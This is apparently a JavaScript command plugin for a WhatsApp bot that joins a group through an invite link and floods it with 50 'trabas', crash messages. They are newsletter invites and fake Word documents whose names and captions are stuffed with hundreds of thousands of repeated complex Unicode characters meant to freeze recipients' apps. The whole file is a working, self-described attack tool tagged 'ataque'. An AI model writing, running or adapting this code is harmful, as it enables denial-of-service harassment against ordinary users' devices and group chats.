import fs from 'fs';

let handler = async (m, { conn, text }) => {
  const ownerNumber = '5491168607589@s.whatsapp.net';
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el bot.', m);
  }

  if (!text || !text.includes('whatsapp.com')) {
    return m.reply('😿 Usa: .mixtraba <enlace del grupo>', m);
  }

  const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
  if (!match) return m.reply('😡 Enlace inválido.', m);

  const inviteCode = match[1];
  let groupId;

  try {
    groupId = await conn.groupAcceptInvite(inviteCode);
  } catch {
    groupId = `120363${inviteCode}@g.us`;
  }

  const canalKillGrupo = async () => {
    const travas = 'ꦾ'.repeat(90000);
    await conn.relayMessage(groupId, {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas.repeat(3),
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    }, {});
  };

  const docKillGrupo = async (i) => {
    const traba = 'ꦾ'.repeat(90000);
    const contenido = '\u200E'.repeat(5000) + i;
    await conn.sendMessage(groupId, {
      document: Buffer.from(contenido),
      fileName: `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2),
      mimetype: 'application/msword',
      caption: traba.repeat(3)
    });
  };

  const canalGato = async () => {
    const travas = '𑇂𑆵𑆴𑆿'.repeat(75000);
    await conn.relayMessage(groupId, {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas.repeat(3),
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    }, {});
  };

  const docGato = async (i) => {
    const traba = '𑇂𑆵𑆴𑆿'.repeat(75000);
    const contenido = '\u200E'.repeat(5000) + i;
    await conn.sendMessage(groupId, {
      document: Buffer.from(contenido),
      fileName: `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2),
      mimetype: 'application/msword',
      caption: traba.repeat(3)
    });
  };

  // Total de mensajes: 50 (en bloques de 4)
  const delayMs = 6000;
  const total = 50;
  const ciclos = Math.floor(total / 4);

  for (let i = 0; i < ciclos; i++) {
    await canalKillGrupo();
    await new Promise(r => setTimeout(r, delayMs));

    await docKillGrupo(i);
    await new Promise(r => setTimeout(r, delayMs));

    await canalGato();
    await new Promise(r => setTimeout(r, delayMs));

    await docGato(i);
    await new Promise(r => setTimeout(r, delayMs));
  }

  // Enviar los mensajes restantes si no fue múltiplo exacto
  const restantes = total % 4;
  const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
  for (let i = 0; i < restantes; i++) {
    await extra[i](i);
    await new Promise(r => setTimeout(r, delayMs));
  }

  await conn.reply(m.chat, `✅ 50 trabas enviados al grupo ${groupId}`, m);
};

handler.help = ['monter01 <enlace>'];
handler.tags = ['ataque', 'grupo'];
handler.command = ['monter01'];

export default handler;